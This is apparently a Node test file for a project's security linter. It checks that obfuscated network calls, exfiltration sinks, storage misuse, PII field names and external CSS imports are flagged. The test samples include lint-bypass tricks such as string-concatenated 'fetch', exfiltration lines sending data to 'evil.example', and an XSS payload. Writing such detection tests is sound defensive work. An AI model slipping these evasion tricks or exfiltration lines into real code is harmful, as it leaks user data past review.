import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { lintCss, lintRepo, lintSource } from "../lint.mjs";

test("AST + regex linter catches all 10 C16 bypass vectors and obfuscated sinks (SEC-M3-005)", () => {
  const webFile = "apps/web/src/ui/Probe.tsx";
  const pkgFile = "packages/domain/src/probe.ts";

  const bypassVectors = [
    // 1. String literal containing `//` followed by `fetch(u)` on the same or next line
    { code: 'const u = "https://a//b"; fetch(u);', file: webFile, scope: "web", match: /network access/ },
    // 2. String literals containing `/*` and `*/` wrapping `fetch(...)`
    { code: 'const a = "/*"; fetch("/x"); const b = "*/";', file: webFile, scope: "web", match: /network access/ },
    // 3. Computed property concatenation `globalThis["fe" + "tch"]`
    { code: 'globalThis["fe" + "tch"]("/steal");', file: webFile, scope: "web", match: /network access/ },
    // 4. Const variable folding + dynamic element access `window[k]`
    { code: 'const k = "fe" + "tch"; window[k]("/steal");', file: webFile, scope: "web", match: /network access/ },
    // 5. Resource exfiltration via `new Image().src`
    { code: 'const img = new Image(); img.src = "https://evil.example/x";', file: webFile, scope: "web", match: /constructor sink/ },
    // 6. Navigation exfiltration via `location.href` / `location.assign` / `location.replace`
    { code: 'location.href = "https://evil.example/?d=1";', file: webFile, scope: "web", match: /navigation sink/ },
    { code: 'window.location.replace("https://evil.example/");', file: webFile, scope: "web", match: /navigation sink/ },
    // 7. Popup / navigation sink `window.open`
    { code: 'window.open("https://evil.example/");', file: webFile, scope: "web", match: /navigation\/popup sink/ },
    // 8. Computed `XMLHttpRequest` via string concat or template literal
    { code: 'const X = window["XML" + "HttpRequest"]; new X();', file: webFile, scope: "web", match: /network access/ },
    { code: 'const X = globalThis[`XML${"HttpRequest"}`];', file: pkgFile, scope: "packages", match: /network access/ },
    // 9. Worker / SharedWorker / Audio constructor sinks
    { code: 'new Worker("sw.js");', file: webFile, scope: "web", match: /constructor sink/ },
    { code: 'new SharedWorker("sw.js");', file: pkgFile, scope: "packages", match: /constructor sink/ },
    { code: 'new Audio("https://evil.example/a.wav");', file: webFile, scope: "web", match: /constructor sink/ },
    // 10. Array.join("") obfuscation & arbitrary computed access on window/document
    { code: 'window[["send", "Beacon"].join("")]("/x");', file: webFile, scope: "web", match: /network access/ },
    { code: 'const dynamicKey = Math.random() > 0 ? "a" : "b"; window[dynamicKey];', file: webFile, scope: "web", match: /computed property access/ },
    // HTML injection via computed property,Storage outside IndexedDB, PII field names, forbidden imports
    { code: 'el["inner" + "HTML"] = "<img onerror=alert(1)>";', file: webFile, scope: "web", match: /HTML injection sink/ },
    { code: 'window["local" + "Storage"].setItem("k", "v");', file: webFile, scope: "web", match: /storage outside IndexedDB/ },
    { code: 'const record = { ["student" + "Id"]: "24020001" };', file: webFile, scope: "web", match: /PII field name/ },
    { code: 'import("@ky-nay/" + "parser");', file: webFile, scope: "web", match: /parser import outside/ },
    { code: 'import("node:" + "fs");', file: webFile, scope: "web", match: /Node built-in import/ },
  ];

  for (const sample of bypassVectors) {
    const errors = lintSource(sample.code, sample.file, sample.scope);
    assert.ok(
      errors.some((err) => sample.match.test(err)),
      `Expected ${sample.code} to match ${sample.match}, got: ${JSON.stringify(errors)}`,
    );
  }
});

test("lintRepo scans .js/.jsx/.cjs files and allows legitimate loader/registration/IndexedDB usage (SEC-M3-005)", () => {
  const tmp = mkdtempSync(join(tmpdir(), "ky-nay-lint-test-"));
  try {
    mkdirSync(join(tmp, "apps", "web", "src", "data"), { recursive: true });
    mkdirSync(join(tmp, "apps", "web", "src", "ui"), { recursive: true });
    mkdirSync(join(tmp, "packages", "domain", "src"), { recursive: true });

    // Legitimate files: loader.ts using fetch, registration import, indexedDB.open, window.location.reload()
    writeFileSync(
      join(tmp, "apps", "web", "src", "data", "loader.ts"),
      'export async function load() { return fetch("./data/manifest.json"); }\n',
    );
    writeFileSync(
      join(tmp, "apps", "web", "src", "ui", "App.tsx"),
      'import { parseRegistration } from "@ky-nay/parser/registration";\nexport function reload() { indexedDB.open("ky-nay", 1); window.location.reload(); return typeof parseRegistration; }\n',
    );
    assert.deepEqual(lintRepo(tmp), []);

    // Plain .js file in apps/web/src attempting obfuscated fetch is caught
    writeFileSync(
      join(tmp, "apps", "web", "src", "ui", "sneaky.js"),
      'const u = "http://x//"; globalThis["fe" + "tch"](u);\n',
    );
    const errors = lintRepo(tmp);
    assert.equal(errors.length, 1);
    assert.match(errors[0], /sneaky\.js:1: network access outside the artifact loader/);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

test("build-time constants are confined to app/build-info.ts, build-env.d.ts and tests (M5-A/M5-B, ADR-0014)", () => {
  const message = /build-time constant outside apps\/web\/src\/app\/build-info\.ts/;
  const reader =
    'export const build = typeof __KY_NAY_BUILD__ === "undefined" ? undefined : __KY_NAY_BUILD__;\n' +
    'export const url = typeof __KY_NAY_REPORT_URL__ === "undefined" ? null : __KY_NAY_REPORT_URL__;\n';
  const declaration = "declare const __KY_NAY_BUILD__: { version: string };\ndeclare const __KY_NAY_REPORT_URL__: string | null;\n";

  // Allowed: the single reader, the ambient declaration and tests.
  assert.deepEqual(lintSource(reader, "apps/web/src/app/build-info.ts", "web"), []);
  assert.deepEqual(lintSource(declaration, "apps/web/src/build-env.d.ts", "web"), []);
  assert.deepEqual(lintSource(reader, "apps/web/src/app/build-info.test.ts", "web"), []);

  // Rejected anywhere else in apps/web/src, including obfuscated property access.
  const rejected = [
    { code: "export const url = __KY_NAY_REPORT_URL__;", file: "apps/web/src/components/ReportIssue.tsx" },
    { code: "const b = __KY_NAY_BUILD__; export default b;", file: "apps/web/src/App.tsx" },
    { code: 'export const b = globalThis["__KY_NAY_" + "BUILD__"];', file: "apps/web/src/model/report-issue.ts" },
    { code: "export const b = window.__KY_NAY_REPORT_URL__;", file: "apps/web/src/main.tsx" },
    // A look-alike file name outside src/app is not the reader.
    { code: "export const b = __KY_NAY_BUILD__;", file: "apps/web/src/components/build-info.ts" },
  ];
  for (const sample of rejected) {
    const errors = lintSource(sample.code, sample.file, "web");
    assert.ok(errors.some((err) => message.test(err)), `Expected ${sample.code} in ${sample.file} to be rejected, got: ${JSON.stringify(errors)}`);
  }

  // lintRepo applies the same rule with absolute paths.
  const tmp = mkdtempSync(join(tmpdir(), "ky-nay-lint-build-"));
  try {
    mkdirSync(join(tmp, "apps", "web", "src", "app"), { recursive: true });
    writeFileSync(join(tmp, "apps", "web", "src", "app", "build-info.ts"), reader);
    writeFileSync(join(tmp, "apps", "web", "src", "build-env.d.ts"), declaration);
    assert.deepEqual(lintRepo(tmp), []);
    writeFileSync(join(tmp, "apps", "web", "src", "app", "Footer.tsx"), "export const v = __KY_NAY_BUILD__.version;\n");
    const errors = lintRepo(tmp);
    assert.equal(errors.length, 1);
    assert.match(errors[0], /Footer\.tsx:1: build-time constant outside/);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

test("M6: runtime stylesheets, FontFace and CSS url()/@import with a scheme are rejected in apps/web/src (DESIGN-M6-001 §12)", () => {
  const file = "apps/web/src/components/Probe.tsx";
  const rejected = [
    { code: 'const s = document.createElement("style");', match: /runtime stylesheet/ },
    { code: "const s = document.createElement('STYLE');", match: /runtime stylesheet/ },
    { code: 'const t = "sty" + "le"; document.createElement(t);', match: /runtime stylesheet/ },
    { code: 'document.createElementNS("http://www.w3.org/2000/svg", "style");', match: /runtime stylesheet/ },
    { code: "const sheet = new CSSStyleSheet();", match: /runtime stylesheet/ },
    { code: "document.adoptedStyleSheets = [];", match: /runtime stylesheet/ },
    { code: 'const f = new FontFace("x", "url(./a.woff2)");', match: /FontFace constructor/ },
    { code: 'const F = window["Font" + "Face"]; new F("x", "y");', match: /FontFace constructor/ },
  ];
  for (const sample of rejected) {
    const errors = lintSource(sample.code, file, "web");
    assert.ok(errors.some((err) => sample.match.test(err)), `Expected ${sample.code} to match ${sample.match}, got: ${JSON.stringify(errors)}`);
  }
  // Allowed: React style props (CSSOM), loading declared fonts, SVG markup and tests.
  for (const code of [
    'export const el = <div style={{ "--c-bg": "x" } as React.CSSProperties} />;',
    'export const ready = document.fonts.load("400 1em \\"Be Vietnam Pro\\"");',
    'export const svg = <svg aria-hidden="true"><path d="M0 0" /></svg>;',
  ]) {
    assert.deepEqual(lintSource(code, file, "web"), [], code);
  }
  assert.deepEqual(lintSource('const s = document.createElement("style");', "apps/web/src/components/Probe.test.tsx", "web"), []);

  const css = "apps/web/src/styles/fonts.css";
  for (const source of [
    '@font-face { src: url(data:font/woff2;base64,AA==) format("woff2"); }',
    "a { background: url( 'https://cdn.example/x.png'); }",
    'a { background: url("//cdn.example/x.png"); }',
    '@import url("https://fonts.example/css");',
    "@import 'http://x.example/a.css';",
    "a { background: URL(Data:image/png;base64,AA==); }",
  ]) {
    assert.match(lintCss(source, css).join("\n"), /url\(\)\/@import with a scheme/, source);
  }
  for (const source of [
    '@font-face { src: url("../assets/fonts/be-vietnam-pro-latin-400-normal.woff2") format("woff2"); }',
    "@import './tokens.css' layer(tokens);",
    "/* url(https://example.com) in a comment is ignored */ a { color: var(--ink); }",
  ]) {
    assert.deepEqual(lintCss(source, css), [], source);
  }
  // Line numbers survive stripped comments.
  assert.match(lintCss("/* a\nb */\na{}\nb{background:url(data:image/png;base64,AA==)}", css)[0], /fonts\.css:4:/);

  // lintRepo walks CSS under apps/web/src only.
  const tmp = mkdtempSync(join(tmpdir(), "ky-nay-lint-css-"));
  try {
    mkdirSync(join(tmp, "apps", "web", "src", "styles"), { recursive: true });
    writeFileSync(join(tmp, "apps", "web", "src", "styles", "ok.css"), "@import './tokens.css';\n");
    assert.deepEqual(lintRepo(tmp), []);
    writeFileSync(join(tmp, "apps", "web", "src", "styles", "bad.css"), "\n@font-face{src:url(data:font/woff2;base64,AA==)}\n");
    const errors = lintRepo(tmp);
    assert.equal(errors.length, 1);
    assert.match(errors[0], /bad\.css:2: url\(\)\/@import with a scheme/);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});
